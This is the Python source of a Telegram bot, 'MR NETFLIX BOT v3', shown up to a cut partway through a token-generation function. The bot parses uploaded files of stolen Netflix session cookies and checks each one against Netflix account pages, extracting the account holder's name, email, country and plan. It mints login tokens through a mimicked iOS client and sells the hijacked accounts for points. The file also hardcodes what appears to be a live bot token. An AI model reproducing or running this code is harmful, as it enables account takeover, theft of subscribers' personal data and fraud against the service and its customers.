# ============================================================
# MR NETFLIX BOT v3 — Languages + Locks + Fast Combo
# ============================================================

import sys
import types

_fake_ap = types.ModuleType("apscheduler")
_fake_sch = types.ModuleType("apscheduler.schedulers")
_fake_asy = types.ModuleType("apscheduler.schedulers.asyncio")
_fake_trg = types.ModuleType("apscheduler.triggers")
_fake_itv = types.ModuleType("apscheduler.triggers.interval")


class _NullSched:
    def __init__(self, *a, **k): pass
    def __getattr__(self, _): return lambda *a, **k: None
    def add_job(self, *a, **k): return None
    def remove_job(self, *a, **k): return None
    def get_jobs(self, *a, **k): return []
    def start(self, *a, **k): pass
    def shutdown(self, *a, **k): pass


_fake_asy.AsyncIOScheduler = _NullSched
_fake_asy.BackgroundScheduler = _NullSched
_fake_sch.asyncio = _fake_asy
_fake_ap.schedulers = _fake_sch
sys.modules["apscheduler"] = _fake_ap
sys.modules["apscheduler.schedulers"] = _fake_sch
sys.modules["apscheduler.schedulers.asyncio"] = _fake_asy
sys.modules["apscheduler.triggers"] = _fake_trg
sys.modules["apscheduler.triggers.interval"] = _fake_itv

import os, re, json, logging, requests, io, zipfile, hashlib, tempfile
import time, asyncio, codecs, html as html_mod, random, string, threading
from collections import defaultdict
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    CallbackQueryHandler, filters, ContextTypes
)
from concurrent.futures import ThreadPoolExecutor
from urllib3.exceptions import InsecureRequestWarning
import urllib.parse

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# ============================================================
# CONFIG — غيّر هنا
# ============================================================
BOT_TOKEN = "9021933468:AAEHgQARV9BXglnxYnk1_o_kmxtTvQebD74"
OWNER_ID = 8409645947
CHANNEL_ID = "@mar_netflix"
TECH_USERNAME = "@BR_Go_16"
STORE_NAME = "MR NETFLIX"
SUPPORT_USERNAME = "@BR_Go_16"

DEFAULT_ACCOUNT_PRICE = 100
DEFAULT_MARKET_PRICE = 500
TOPUP_STARS = 15
TOPUP_POINTS = 15
REFERRAL_POINTS = 1

COOKIES_DIR = "vault"
USERS_FILE = "users.json"
TOPOPS_FILE = "pending_topups.json"
DYN_ADMINS_FILE = "dyn_admins.json"
CONFIG_FILE = "config.json"

os.makedirs(COOKIES_DIR, exist_ok=True)

MAX_WORKERS = 30
BATCH_SIZE = 15
REQUEST_TIMEOUT = 20
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"

REQUIRED_COOKIES = ("NetflixId",)
OPTIONAL_COOKIES = ("SecureNetflixId", "nfvdid", "OptanonConsent")
ALL_COOKIE_NAMES = set(REQUIRED_COOKIES + OPTIONAL_COOKIES)
CANONICAL_NAMES = {name.lower(): name for name in ALL_COOKIE_NAMES}

NFTOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
NFTOKEN_QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"kidsBillboardEnabled":"true","billboardEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone", "iosVersion": "15.8.5", "isTablet": "false",
    "languages": "en-US", "locale": "en-US", "maxDeviceWidth": "375",
    "model": "saget", "modelType": "IPHONE8-1", "odpAware": "true",
    "path": '["account","token","default"]', "pathFormat": "graph",
    "pixelDensity": "2.0", "progressive": "false", "responseFormat": "json",
}

NFTOKEN_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.client.type": "argo",
    "accept-language": "en-US;q=1",
}

cookie_lock = threading.Lock()
users_lock = threading.Lock()
topups_lock = threading.Lock()
tv_stats_lock = threading.Lock()
_config_lock = threading.Lock()
_admins_lock = threading.Lock()

tv_stats = {
    "total_logins": 0, "successful": 0, "failed": 0,
    "codes_rejected": 0,
    "started_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
}

logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)

user_state = {}
user_executors = {}
user_locks = defaultdict(asyncio.Lock)

# ============================================================
# LANGUAGES
# ============================================================
LANGS = {
    "ar": {"flag": "🇸🇦", "name": "العربية"},
    "en": {"flag": "🇫🇴", "name": "English"},
    "fr": {"flag": "🇫🇷", "name": "Français"},
}

TEXTS = {
    "ar": {
        "welcome": "🎬 <b>MR NETFLIX</b>\n\n👋 مرحبا <b>{name}</b>!\n💰 رصيدك: <b>{points}</b> نقطة\n🏷️ سعر الحساب: <b>{price}</b> نقطة (~{market} د.ج)\n\nاختر من الأزرار:",
        "choose_lang": "🌐 <b>اختر لغتك</b>\n\nPlease choose your language\nVeuillez choisir votre langue",
        "buy": "🛒 شراء حساب", "topup": "💰 شحن", "ref": "🎁 الإحالة",
        "purchases": "📦 مشترياتي", "account": "👤 حسابي", "support": "📞 الدعم",
        "admin": "👑 الأدمن", "back": "🔙 رجوع",
        "phone": "📱 هاتف", "tv": "📺 TV",
        "check": "🔍 فحص كومبو", "clear": "🗑️ حذف كوكيزات",
        "price": "💵 السعر", "market": "💰 سوق",
        "addp": "➕ إضافة نقاط", "remp": "➖ خصم نقاط",
        "promote": "👥 رفع أدمن", "demote": "📉 تنزيل أدمن",
        "topups": "💳 طلبات شحن", "stats": "📊 إحصائيات",
        "lang": "🌐 اللغة",
        "insufficient": "❌ <b>نقاطك غير كافية</b>\n\n💰 رصيدك: <b>{points}</b>\n🏷️ السعر: <b>{price}</b>\n📉 تحتاج: <b>{need}</b>",
        "vault_empty": "❌ <b>الخزنة فارغة</b>\n\nلا توجد حسابات متاحة.",
        "buy_choose": "🛒 <b>شراء حساب</b>\n\n💰 السعر: <b>{price}</b> نقطة\n🎯 رصيدك: <b>{points}</b>\n📦 المتاح: <b>{vault}</b>\n\nاختر نوع التفعيل:",
        "tv_input": "📺 <b>تفعيل TV</b>\n\nأرسل كود الشاشة (8 أرقام):",
        "topup_info": "💰 <b>شحن الرصيد</b>\n\n⭐ المطلوب: <b>{stars} نجمة</b>\n➕ تحصل على: <b>{points} نقطة</b>\n\n📞 تواصل مع: {tech}",
        "topup_sent": "✅ <b>تم إرسال طلب الشحن</b>\n\n⏳ في انتظار الموافقة.",
        "pending_topup": "⏳ <b>عندك طلب شحن قيد المراجعة</b>\n\n📞 {tech}",
        "ref_info": "🎁 <b>رابط الإحالة</b>\n\n<code>{link}</code>\n\n💰 كل صديق = <b>+{points} نقطة</b>",
        "no_purchases": "📦 <b>مشترياتي</b>\n\nلا توجد مشتريات.",
        "purchases_list": "📦 <b>مشترياتي ({count})</b>\n\n{items}\n\n💰 رصيدك: <b>{balance}</b>",
        "acc_info": "👤 <b>حسابي</b>\n\n🆔 <b>ID:</b> <code>{uid}</code>\n💰 <b>النقاط:</b> {points}\n🎁 <b>الإحالات:</b> {refs}\n📦 <b>المشتريات:</b> {purchases}\n📅 <b>الانضمام:</b> {joined}",
        "check_prompt": "🔍 <b>فحص كومبو</b>\n\n📤 ارفع ملف .txt / .json / .zip\n⚙️ فحص بريميوم فقط وحفظهم.",
        "price_prompt": "💵 <b>تغيير السعر</b>\n\nالحالي: <b>{current}</b> نقطة\n\nأرسل السعر الجديد:",
        "market_prompt": "💰 <b>سعر السوق</b>\n\nالحالي: <b>{current}</b> د.ج\n\nأرسل السعر الجديد:",
        "addp_prompt": "➕ <b>إضافة نقاط</b>\n\nأرسل: <code>user_id نقاط</code>\nمثال: <code>123456789 15</code>",
        "remp_prompt": "➖ <b>خصم نقاط</b>\n\nأرسل: <code>user_id نقاط</code>\nمثال: <code>123456789 10</code>",
        "promote_prompt": "👥 <b>رفع أدمن</b>\n\nأرسل ID المستخدم:",
        "demote_prompt": "📉 <b>تنزيل أدمن</b>\n\nأرسل ID المستخدم:",
        "no_topups": "💳 <b>طلبات الشحن</b>\n\nلا توجد طلبات.",
        "admin_title": "👑 <b>لوحة الأدمن</b>\n\n💰 السعر: <b>{price}</b> نقطة\n💵 السوق: <b>{market}</b> د.ج\n📦 الخزنة: <b>{vault}</b>\n💳 طلبات: <b>{topups}</b>",
        "buy_success": "✅ <b>تم الشراء!</b>\n\n👤 {name}\n📧 <code>{email}</code>\n🌍 {country}\n📦 {plan}\n⏰ {expires}\n💰 رصيدك: <b>{balance}</b>\n\n📱 <b>هاتف:</b>\n<code>{phone_url}</code>\n\n💻 <b>كمبيوتر:</b>\n<code>{pc_url}</code>",
        "tv_success": "✅ <b>تم التفعيل!</b>\n\n📺 <code>{code}</code>\n🌍 {country}\n📦 {plan}\n💰 رصيدك: <b>{balance}</b>",
        "tv_failed": "❌ <b>فشل التفعيل</b>\n\n⚠️ {error}\n\nلم يتم خصم نقاط.",
        "processing": "⏳ جاري المعالجة...",
        "stop": "🛑 إيقاف",
        "invalid_number": "❌ رقم غير صالح",
        "invalid_format": "❌ صيغة خاطئة",
        "lang_changed": "✅ تم تغيير اللغة",
        "already_pending": "⚠️ موجود مسبقاً",
        "not_admin": "⚠️ مو أدمن",
        "promoted": "✅ تم رفع الأدمن: {uid}",
        "demoted": "✅ تم تنزيل الأدمن: {uid}",
        "added_points": "✅ +{amount} نقطة لـ {uid}\n💰 الرصيد: {balance}",
        "removed_points": "✅ -{amount} نقطة من {uid}\n💰 الرصيد: {balance}",
    },
    "en": {
        "welcome": "🎬 <b>MR NETFLIX</b>\n\n👋 Hello <b>{name}</b>!\n💰 Balance: <b>{points}</b> points\n🏷️ Account price: <b>{price}</b> points (~{market} DZD)\n\nChoose:",
        "choose_lang": "🌐 <b>Choose your language</b>\n\nPlease choose your language",
        "buy": "🛒 Buy", "topup": "💰 Top Up", "ref": "🎁 Referral",
        "purchases": "📦 My Purchases", "account": "👤 Account", "support": "📞 Support",
        "admin": "👑 Admin", "back": "🔙 Back",
        "phone": "📱 Phone", "tv": "📺 TV",
        "check": "🔍 Check Combo", "clear": "🗑️ Clear Vault",
        "price": "💵 Price", "market": "💰 Market",
        "addp": "➕ Add Points", "remp": "➖ Remove Points",
        "promote": "👥 Promote", "demote": "📉 Demote",
        "topups": "💳 Top-Ups", "stats": "📊 Stats",
        "lang": "🌐 Language",
        "insufficient": "❌ <b>Insufficient Points</b>\n\n💰 Balance: <b>{points}</b>\n🏷️ Price: <b>{price}</b>\n📉 Need: <b>{need}</b>",
        "vault_empty": "❌ <b>Vault is Empty</b>\n\nNo accounts available.",
        "buy_choose": "🛒 <b>Buy Account</b>\n\n💰 Price: <b>{price}</b> points\n🎯 Balance: <b>{points}</b>\n📦 Available: <b>{vault}</b>\n\nChoose activation:",
        "tv_input": "📺 <b>TV Activation</b>\n\nSend 8-digit code from TV:",
        "topup_info": "💰 <b>Top Up</b>\n\n⭐ Required: <b>{stars} Stars</b>\n➕ Get: <b>{points} points</b>\n\n📞 Contact: {tech}",
        "topup_sent": "✅ <b>Top-Up Request Sent</b>\n\n⏳ Awaiting approval.",
        "pending_topup": "⏳ <b>Pending Top-Up</b>\n\n📞 {tech}",
        "ref_info": "🎁 <b>Referral Link</b>\n\n<code>{link}</code>\n\n💰 Each friend = <b>+{points} points</b>",
        "no_purchases": "📦 <b>My Purchases</b>\n\nNo purchases yet.",
        "purchases_list": "📦 <b>My Purchases ({count})</b>\n\n{items}\n\n💰 Balance: <b>{balance}</b>",
        "acc_info": "👤 <b>My Account</b>\n\n🆔 <b>ID:</b> <code>{uid}</code>\n💰 <b>Points:</b> {points}\n🎁 <b>Referrals:</b> {refs}\n📦 <b>Purchases:</b> {purchases}\n📅 <b>Joined:</b> {joined}",
        "check_prompt": "🔍 <b>Check Combo</b>\n\n📤 Upload .txt / .json / .zip\n⚙️ Premium only, saved to vault.",
        "price_prompt": "💵 <b>Set Price</b>\n\nCurrent: <b>{current}</b> points\n\nSend new price:",
        "market_prompt": "💰 <b>Market Price</b>\n\nCurrent: <b>{current}</b> DZD\n\nSend new price:",
        "addp_prompt": "➕ <b>Add Points</b>\n\nSend: <code>user_id points</code>\nExample: <code>123456789 15</code>",
        "remp_prompt": "➖ <b>Remove Points</b>\n\nSend: <code>user_id points</code>\nExample: <code>123456789 10</code>",
        "promote_prompt": "👥 <b>Promote Admin</b>\n\nSend user ID:",
        "demote_prompt": "📉 <b>Demote Admin</b>\n\nSend user ID:",
        "no_topups": "💳 <b>Top-Up Requests</b>\n\nNo requests.",
        "admin_title": "👑 <b>Admin Panel</b>\n\n💰 Price: <b>{price}</b> points\n💵 Market: <b>{market}</b> DZD\n📦 Vault: <b>{vault}</b>\n💳 Requests: <b>{topups}</b>",
        "buy_success": "✅ <b>Purchase Complete!</b>\n\n👤 {name}\n📧 <code>{email}</code>\n🌍 {country}\n📦 {plan}\n⏰ {expires}\n💰 Balance: <b>{balance}</b>\n\n📱 <b>Phone:</b>\n<code>{phone_url}</code>\n\n💻 <b>PC:</b>\n<code>{pc_url}</code>",
        "tv_success": "✅ <b>Activated!</b>\n\n📺 <code>{code}</code>\n🌍 {country}\n📦 {plan}\n💰 Balance: <b>{balance}</b>",
        "tv_failed": "❌ <b>Activation Failed</b>\n\n⚠️ {error}\n\nNo points deducted.",
        "processing": "⏳ Processing...",
        "stop": "🛑 Stop",
        "invalid_number": "❌ Invalid number",
        "invalid_format": "❌ Invalid format",
        "lang_changed": "✅ Language changed",
        "already_pending": "⚠️ Already exists",
        "not_admin": "⚠️ Not admin",
        "promoted": "✅ Admin promoted: {uid}",
        "demoted": "✅ Admin demoted: {uid}",
        "added_points": "✅ +{amount} points to {uid}\n💰 Balance: {balance}",
        "removed_points": "✅ -{amount} points from {uid}\n💰 Balance: {balance}",
    },
    "fr": {
        "welcome": "🎬 <b>MR NETFLIX</b>\n\n👋 Bonjour <b>{name}</b>!\n💰 Solde: <b>{points}</b> points\n🏷️ Prix: <b>{price}</b> points (~{market} DZD)\n\nChoisissez:",
        "choose_lang": "🌐 <b>Choisissez votre langue</b>\n\nVeuillez choisir votre langue",
        "buy": "🛒 Acheter", "topup": "💰 Recharger", "ref": "🎁 Parrainage",
        "purchases": "📦 Mes Achats", "account": "👤 Compte", "support": "📞 Support",
        "admin": "👑 Admin", "back": "🔙 Retour",
        "phone": "📱 Téléphone", "tv": "📺 TV",
        "check": "🔍 Vérifier Combo", "clear": "🗑️ Vider Coffre",
        "price": "💵 Prix", "market": "💰 Marché",
        "addp": "➕ Ajouter Points", "remp": "➖ Retirer Points",
        "promote": "👥 Promouvoir", "demote": "📉 Rétrograder",
        "topups": "💳 Recharges", "stats": "📊 Stats",
        "lang": "🌐 Langue",
        "insufficient": "❌ <b>Points Insuffisants</b>\n\n💰 Solde: <b>{points}</b>\n🏷️ Prix: <b>{price}</b>\n📉 Besoin: <b>{need}</b>",
        "vault_empty": "❌ <b>Coffre Vide</b>\n\nAucun compte disponible.",
        "buy_choose": "🛒 <b>Acheter Compte</b>\n\n💰 Prix: <b>{price}</b> points\n🎯 Solde: <b>{points}</b>\n📦 Disponible: <b>{vault}</b>\n\nChoisir activation:",
        "tv_input": "📺 <b>Activation TV</b>\n\nEnvoyez le code à 8 chiffres:",
        "topup_info": "💰 <b>Recharger</b>\n\n⭐ Requis: <b>{stars} Étoiles</b>\n➕ Reçu: <b>{points} points</b>\n\n📞 Contact: {tech}",
        "topup_sent": "✅ <b>Demande Envoyée</b>\n\n⏳ En attente d'approbation.",
        "pending_topup": "⏳ <b>Recharge en attente</b>\n\n📞 {tech}",
        "ref_info": "🎁 <b>Lien de Parrainage</b>\n\n<code>{link}</code>\n\n💰 Chaque ami = <b>+{points} points</b>",
        "no_purchases": "📦 <b>Mes Achats</b>\n\nAucun achat.",
        "purchases_list": "📦 <b>Mes Achats ({count})</b>\n\n{items}\n\n💰 Solde: <b>{balance}</b>",
        "acc_info": "👤 <b>Mon Compte</b>\n\n🆔 <b>ID:</b> <code>{uid}</code>\n💰 <b>Points:</b> {points}\n🎁 <b>Parrainages:</b> {refs}\n📦 <b>Achats:</b> {purchases}\n📅 <b>Inscrit:</b> {joined}",
        "check_prompt": "🔍 <b>Vérifier Combo</b>\n\n📤 Uploadez .txt / .json / .zip\n⚙️ Premium seulement, sauvegardé.",
        "price_prompt": "💵 <b>Définir Prix</b>\n\nActuel: <b>{current}</b> points\n\nEnvoyez le nouveau prix:",
        "market_prompt": "💰 <b>Prix du Marché</b>\n\nActuel: <b>{current}</b> DZD\n\nEnvoyez le nouveau prix:",
        "addp_prompt": "➕ <b>Ajouter Points</b>\n\nEnvoyez: <code>user_id points</code>\nExemple: <code>123456789 15</code>",
        "remp_prompt": "➖ <b>Retirer Points</b>\n\nEnvoyez: <code>user_id points</code>\nExemple: <code>123456789 10</code>",
        "promote_prompt": "👥 <b>Promouvoir Admin</b>\n\nEnvoyez l'ID:",
        "demote_prompt": "📉 <b>Rétrograder Admin</b>\n\nEnvoyez l'ID:",
        "no_topups": "💳 <b>Demandes de Recharge</b>\n\nAucune demande.",
        "admin_title": "👑 <b>Panneau Admin</b>\n\n💰 Prix: <b>{price}</b> points\n💵 Marché: <b>{market}</b> DZD\n📦 Coffre: <b>{vault}</b>\n💳 Demandes: <b>{topups}</b>",
        "buy_success": "✅ <b>Achat Réussi!</b>\n\n👤 {name}\n📧 <code>{email}</code>\n🌍 {country}\n📦 {plan}\n⏰ {expires}\n💰 Solde: <b>{balance}</b>\n\n📱 <b>Téléphone:</b>\n<code>{phone_url}</code>\n\n💻 <b>PC:</b>\n<code>{pc_url}</code>",
        "tv_success": "✅ <b>Activé!</b>\n\n📺 <code>{code}</code>\n🌍 {country}\n📦 {plan}\n💰 Solde: <b>{balance}</b>",
        "tv_failed": "❌ <b>Échec Activation</b>\n\n⚠️ {error}\n\nAucun point déduit.",
        "processing": "⏳ Traitement...",
        "stop": "🛑 Arrêter",
        "invalid_number": "❌ Numéro invalide",
        "invalid_format": "❌ Format invalide",
        "lang_changed": "✅ Langue changée",
        "already_pending": "⚠️ Existe déjà",
        "not_admin": "⚠️ Pas admin",
        "promoted": "✅ Admin promu: {uid}",
        "demoted": "✅ Admin rétrogradé: {uid}",
        "added_points": "✅ +{amount} points à {uid}\n💰 Solde: {balance}",
        "removed_points": "✅ -{amount} points de {uid}\n💰 Solde: {balance}",
    },
}


def t(uid, key, **kwargs):
    user = get_user(uid)
    lang = user.get("lang", "ar")
    template = TEXTS.get(lang, TEXTS["ar"]).get(key, key)
    try:
        return template.format(**kwargs) if kwargs else template
    except Exception:
        return template


# ============================================================
# JSON HELPERS
# ============================================================
def _load_json(path, default):
    if not os.path.exists(path):
        return default
    try:
        with open(path, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return default


def _save_json(path, data):
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)


# ============================================================
# USERS
# ============================================================
def load_users():
    return _load_json(USERS_FILE, {})


def save_users(u):
    with users_lock:
        _save_json(USERS_FILE, u)


def get_user(uid):
    uid = str(uid)
    users = load_users()
    if uid not in users:
        users[uid] = {
            "points": 0, "referrer": None, "purchases": [],
            "username": None, "lang": None,
            "joined_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        }
        save_users(users)
    return users[uid]


def set_user(uid, data):
    uid = str(uid)
    users = load_users()
    users[uid] = data
    save_users(users)


def add_points(uid, amount):
    uid = str(uid)
    users = load_users()
    if uid not in users:
        users[uid] = {
            "points": 0, "referrer": None, "purchases": [],
            "username": None, "lang": None,
            "joined_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        }
    users[uid]["points"] = users[uid].get("points", 0) + amount
    save_users(users)
    return users[uid]["points"]


def remove_points(uid, amount):
    uid = str(uid)
    users = load_users()
    if uid not in users:
        return 0
    users[uid]["points"] = max(0, users[uid].get("points", 0) - amount)
    save_users(users)
    return users[uid]["points"]


def get_user_points(uid):
    return get_user(uid).get("points", 0)


# ============================================================
# CONFIG
# ============================================================
def load_config():
    with _config_lock:
        if not os.path.exists(CONFIG_FILE):
            cfg = {
                "account_price": DEFAULT_ACCOUNT_PRICE,
                "market_price": DEFAULT_MARKET_PRICE,
                "topup_stars": TOPUP_STARS,
                "topup_points": TOPUP_POINTS,
                "referral_points": REFERRAL_POINTS,
            }
            _save_json(CONFIG_FILE, cfg)
            return cfg
        return _load_json(CONFIG_FILE, {})


def save_config(cfg):
    with _config_lock:
        _save_json(CONFIG_FILE, cfg)


def get_account_price():
    return load_config().get("account_price", DEFAULT_ACCOUNT_PRICE)


def get_market_price():
    return load_config().get("market_price", DEFAULT_MARKET_PRICE)


def set_account_price(p):
    cfg = load_config()
    cfg["account_price"] = int(p)
    save_config(cfg)


def set_market_price(p):
    cfg = load_config()
    cfg["market_price"] = int(p)
    save_config(cfg)


# ============================================================
# ADMINS
# ============================================================
def load_dyn_admins():
    return _load_json(DYN_ADMINS_FILE, [])


def save_dyn_admins(lst):
    with _admins_lock:
        _save_json(DYN_ADMINS_FILE, lst)


dyn_admins = load_dyn_admins()


def is_admin(uid):
    return uid == OWNER_ID or uid in dyn_admins


# ============================================================
# TOPUPS
# ============================================================
def load_topups():
    return _load_json(TOPOPS_FILE, {})


def save_topups(t_):
    with topups_lock:
        _save_json(TOPOPS_FILE, t_)


def has_pending_topup(uid):
    return str(uid) in load_topups()


def create_topup(uid, username=None):
    tp = load_topups()
    tp[str(uid)] = {
        "user_id": uid, "username": username,
        "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "status": "pending",
    }
    save_topups(tp)


def approve_topup(uid, points):
    tp = load_topups()
    entry = tp.pop(str(uid), None)
    save_topups(tp)
    if entry:
        add_points(uid, points)
        return True
    return False


def reject_topup(uid):
    tp = load_topups()
    entry = tp.pop(str(uid), None)
    save_topups(tp)
    return bool(entry)


# ============================================================
# COOKIE HELPERS
# ============================================================
def safe_filename(name):
    return re.sub(r'[^a-zA-Z0-9_\-\.]', '_', name)


def clean_unicode(val):
    if not isinstance(val, str): return val
    try: val = codecs.decode(val, 'unicode_escape')
    except Exception: pass
    try: val = html_mod.unescape(val)
    except Exception: pass
    val = val.encode('utf-8', errors='replace').decode('utf-8', errors='replace')
    return ''.join(c for c in val if ord(c) >= 32 or c in '\n\r\t')


def safe_html(text):
    if not text: return "Unknown"
    text = clean_unicode(str(text))
    return text.encode('utf-8', errors='replace').decode('utf-8', errors='replace')


def dict_to_netscape(cd, domain=".netflix.com"):
    expiry = int(time.time()) + 180 * 24 * 3600
    lines = ["# Netscape HTTP Cookie File"]
    for k, v in cd.items():
        lines.append(f"{domain}\tTRUE\t/\tFALSE\t{expiry}\t{k}\t{v}")
    return "\n".join(lines)


NETFLIX_COOKIE_NAMES = {
    "NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent",
    "flwssn", "memclid", "profilesNewSession", "clSharedContext"
}


def canonicalize_name(name):
    return CANONICAL_NAMES.get(str(name or "").strip().lower(), str(name or "").strip())


def is_netflix_cookie(domain, name):
    return canonicalize_name(name) in ALL_COOKIE_NAMES or "netflix." in str(domain or "").lower()


def extract_cookie_dict_tv(content):
    entries = {}
    for line in content.splitlines():
        line = line.strip()
        if not line: continue
        if line.startswith("#HttpOnly_"): line = line[len("#HttpOnly_"):]
        parts = line.split("\t")
        if len(parts) >= 7:
            name = canonicalize_name(parts[5])
            if is_netflix_cookie(parts[0], name):
                entries[name] = parts[6]
    if entries.get("NetflixId"): return entries
    try:
        data = json.loads(content)
        if isinstance(data, dict):
            data = data.get("cookies") or data.get("items") or [data]
        if isinstance(data, list):
            for c in data:
                if isinstance(c, dict):
                    name = canonicalize_name(c.get("name", ""))
                    if is_netflix_cookie(c.get("domain", ""), name):
                        entries[name] = str(c.get("value", ""))
    except Exception:
        pass
    if entries.get("NetflixId"): return entries
    for cn in ALL_COOKIE_NAMES:
        m = re.search(rf'{cn}\s*[:=]\s*([^\s;,\n"\']+)', content, re.IGNORECASE)
        if m: entries[cn] = m.group(1).strip('"\'')
    return entries if entries.get("NetflixId") else None


def parse_cookie_file(text):
    text = text.strip()
    results = []
    try:
        if text.startswith("{") or text.startswith("["):
            obj = json.loads(text)
            if isinstance(obj, dict):
                cd = {k: str(v) for k, v in obj.items() if k in NETFLIX_COOKIE_NAMES}
                if cd.get('NetflixId'):
                    results.append(("json_block", cd))
                if "cookies" in obj and isinstance(obj["cookies"], list):
                    m = {}
                    for c in obj["cookies"]:
                        if isinstance(c, dict) and "name" in c and "value" in c:
                            if c["name"] in NETFLIX_COOKIE_NAMES:
                                m[c["name"]] = c["value"]
                    if m.get('NetflixId'):
                        results.append(("json_cookies", m))
            elif isinstance(obj, list):
                m = {}
                for c in obj:
                    if isinstance(c, dict):
                        n = c.get("name") or c.get("key")
                        v = c.get("value")
                        if n and v and n in NETFLIX_COOKIE_NAMES:
                            m[n] = v
                if m.get('NetflixId'):
                    results.append(("json_list", m))
    except Exception:
        pass
    netscape = []
    for line in text.splitlines():
        line = line.strip()
        if not line: continue
        if line.startswith("#") and not line.startswith("#HttpOnly_"): continue
        if line.startswith("#HttpOnly_"): line = line[len("#HttpOnly_"):]
        parts = line.split("\t")
        if len(parts) >= 7 and parts[5] in NETFLIX_COOKIE_NAMES:
            netscape.append({"name": parts[5], "value": parts[6]})
    if netscape:
        nf_ids = [(i, e) for i, e in enumerate(netscape) if e["name"] == "NetflixId"]
        for nf_idx, nf_entry in nf_ids:
            cs = {"NetflixId": nf_entry["value"]}
            for e in netscape:
                if e["name"] != "NetflixId": cs[e["name"]] = e["value"]
            results.append((f"netscape_{nf_idx}", cs))
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"): continue
        sc = {}
        for part in line.split(";"):
            part = part.strip()
            if "=" in part:
                k, v = part.split("=", 1)
                k, v = k.strip(), v.strip()
                if k in NETFLIX_COOKIE_NAMES: sc[k] = v
        if sc.get('NetflixId'):
            results.append((f"semicolon_{len(results)}", sc))
    nf_matches = re.findall(r'NetflixId\s*[:=]\s*([^\s;,\n"\']{20,})', text, re.IGNORECASE)
    for nf_val in nf_matches:
        nf_val = nf_val.strip('"\'')
        cs = {"NetflixId": nf_val}
        for cn in NETFLIX_COOKIE_NAMES - {"NetflixId"}:
            m = re.search(rf'{cn}\s*[:=]\s*([^\s;,\n"\']+)', text, re.IGNORECASE)
            if m: cs[cn] = m.group(1).strip('"\'')
        results.append((f"regex_{len(results)}", cs))
    return results


async def extract_cookies_from_zip(zip_path):
    cookies = []
    with zipfile.ZipFile(zip_path, 'r') as z:
        for info in z.infolist():
            if info.is_dir(): continue
            if info.filename.startswith('__MACOSX') or info.filename.startswith('.'): continue
            if info.filename.lower().endswith(('.txt', '.json')):
                with z.open(info) as f:
                    try:
                        content = f.read().decode('utf-8', errors='ignore')
                        c = parse_cookie_file(content)
                        for idx, (bn, cc) in enumerate(c):
                            cookies.append((f"{safe_filename(info.filename)}_{idx}", cc))
                    except Exception:
                        continue
    return cookies


def check_netflix_cookie(cookie_dict):
    if not cookie_dict.get('NetflixId'):
        return {'ok': False, 'reason': 'No NetflixId', 'cookie': cookie_dict}
    session = requests.Session()
    session.cookies.update(cookie_dict)
    headers = {'User-Agent': USER_AGENT, 'Accept': 'text/html,application/xhtml+xml',
               'Accept-Language': 'en-US,en;q=0.9'}
    try:
        urls = ['https://www.netflix.com/YourAccount', 'https://www.netflix.com/account']
        resp = None; txt = ""
        for url in urls:
            try:
                r = session.get(url, headers=headers, timeout=12, allow_redirects=True)
                if r.status_code == 200 and 'Account' in r.text:
                    resp = r; txt = r.text; break
            except Exception:
                continue
        if not resp or resp.status_code != 200:
            return {'ok': False, 'reason': 'conn fail', 'cookie': cookie_dict}
        if 'login' in resp.url.lower() or 'signin' in resp.url.lower():
            return {'ok': False, 'reason': 'login redirect', 'cookie': cookie_dict}

        def find(p):
            m = re.search(p, txt)
            return safe_html(m.group(1)) if m else None

        name = find(r'"accountOwnerName"\s*:\s*"([^"]+)"') or find(r'"firstName"\s*:\s*"([^"]+)"')
        plan = find(r'localizedPlanName.{1,50}?value":"([^"]+)"') or find(r'"planName"\s*:\s*"([^"]+)"')
        country = find(r'"countryOfSignup"\s*:\s*"([^"]+)"') or find(r'"currentCountry"\s*:\s*"([^"]+)"')
        email = find(r'"emailAddress"\s*:\s*"([^"]+)"') or find(r'"email"\s*:\s*"([^"]+)"')
        ms = None
        m = re.search(r'"membershipStatus":\s*"([^"]+)"', txt)
        if m: ms = m.group(1)
        has_data = any([name, email, country, plan, ms])
        if not has_data:
            return {'ok': False, 'reason': 'no data', 'cookie': cookie_dict}
        return {
            'ok': True, 'premium': ms == 'CURRENT_MEMBER',
            'name': name or 'Unknown', 'email': email or 'Unknown',
            'country': country or 'Unknown', 'plan': plan or 'Unknown',
            'membership_status': ms or 'Unknown', 'cookie': cookie_dict
        }
    except Exception as e:
        return {'ok': False, 'reason': str(e)[:30], 'cookie': cookie_dict}


def generate_nftoken(cookie_dict):
    if not cookie_dict.get('NetflixId'):
        return None, "No NetflixId"
    headers = dict(NFTOKEN_HEADERS)
    headers["Cookie"] = f"NetflixId={cookie_dict['NetflixId']}"
    try:
        r = requests.get(NFTOKEN_API_URL, params=NFTOKEN_QUERY_PARAMS,
                         headers=headers, timeout=8, verify=False)
        r.raise_for_status()
        data = r.json()
        td = ((((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {})
        token = td.get("token"); expires = td.get("expires")
        if not token: return None, "Dead cookie"
        if isinstance(expires, int) and len(str(expires)) == 13: expires //= 1000
